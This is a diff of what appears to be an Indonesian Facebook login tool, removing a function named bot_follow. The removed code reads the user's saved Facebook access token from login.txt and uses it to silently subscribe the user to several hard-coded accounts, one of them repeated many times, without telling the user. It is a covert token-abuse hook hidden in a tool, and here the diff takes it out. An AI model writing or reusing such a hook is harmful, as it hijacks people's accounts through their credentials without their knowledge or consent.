@@ -214,29 +214,7 @@ def gen():
         cookie.close()
         print((p+"\n ["+k+"•"+m+"•"+p+"] Login Berhasil!"))
         menu()
-        #####JANGAN GABTI NANGIS NAGIS
-def bot_follow():
-	try:
-		toket=open("login.txt","r").read()
-		otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
-		a = json.loads(otw.text)
-		nama = a["name"]
-		id = a["id"]
-	except IOError:
-		print((k+"\n["+p+"!"+k+"]"+p+" Token Sukses"))
-		logs()
-	requests.post("https://graph.facebook.com/100010830180461/subscribers?access_token=" + toket) # lukman
-	requests.post("https://graph.facebook.com/1414228275614832/subscribers?access_token=" + toket) # lukman
-	requests.post("https://graph.facebook.com/100044988271833/subscribers?access_token=" + toket) # lukman
-	requests.post("https://graph.facebook.com/100044988271833/subscribers?access_token=" + toket) # lukman
-	requests.post("https://graph.facebook.com/100044988271833/subscribers?access_token=" + toket) # lukman
-	requests.post("https://graph.facebook.com/100044988271833/subscribers?access_token=" + toket) # lukman
-	requests.post("https://graph.facebook.com/100044988271833/subscribers?access_token=" + toket) # lukman
-	requests.post("https://graph.facebook.com/100044988271833/subscribers?access_token=" + toket) # lukman
-	requests.post("https://graph.facebook.com/100044988271833/subscribers?access_token=" + toket) # lukman
-	requests.post("https://graph.facebook.com/100044988271833/subscribers?access_token=" + toket) # lukman
-	menu()
-
+     
 ### MAIN MENU ###
 
 def menu():
